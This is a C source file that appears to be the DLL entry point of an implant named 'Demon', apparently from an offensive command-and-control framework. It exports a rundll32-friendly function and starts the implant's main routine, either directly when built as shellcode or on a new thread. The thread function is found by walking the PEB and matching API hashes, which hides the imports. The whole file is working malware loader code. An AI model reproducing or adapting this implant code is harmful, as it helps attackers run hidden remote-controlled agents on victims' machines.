#include <Demon.h>

#include <Common/Defines.h>

HINSTANCE hAppInstance = NULL;

/* Export this for rundll32 or any other program that requires and exported functions...
 * TODO: make this function name optional/changeable in the payload generator.*/
DLLEXPORT VOID Start(  )
{
    /* prevent exiting if started using rundll32 or something */
    for (;;);
}

/* this is our entrypoint for the Dll (also for shellcode) */
BOOL WINAPI DllMain( HINSTANCE hDllBase, DWORD Reason, LPVOID Reserved )
{
    if ( Reason == DLL_PROCESS_ATTACH )
    {
        hAppInstance = hDllBase;

#ifdef DEBUG
        /* if the dll is compiled in debug mode start a console to write our debug prints to */
        AllocConsole();
        freopen("CONOUT$", "w", stdout);
#endif

#ifdef SHELLCODE
        /* we dont need to make a new thread since we get loaded by our shellcode */
        DemonMain( hDllBase );
#else
        /* if we don't compile for the shellcode then start a new thread.
         * why? because if not then we get an ERROR_INVALID_STATE from WinHttpSendRequest
         * because we can't make HTTP requests in DllMain which seems that WinHTTP doesn't like */
        PVOID Kernel32  = LdrModulePeb( HASH_KERNEL32 );
        HANDLE ( WINAPI *NewThread ) (
                LPSECURITY_ATTRIBUTES,
                SIZE_T,
                LPTHREAD_START_ROUTINE,
                LPVOID,
                DWORD,
                LPDWORD
        ) = LdrFunctionAddr( Kernel32, 0x7f08f451 ); /* this hash is for CreateThread in Kernel32.
                                                      * you can load another function here using
                                                      * LdrModulePeb or LdrModuleLoad then LdrFunctionAddr */

        NewThread( NULL, 0, DemonMain, hDllBase, 0, NULL );
#endif
        return TRUE;
    }

    return FALSE;
}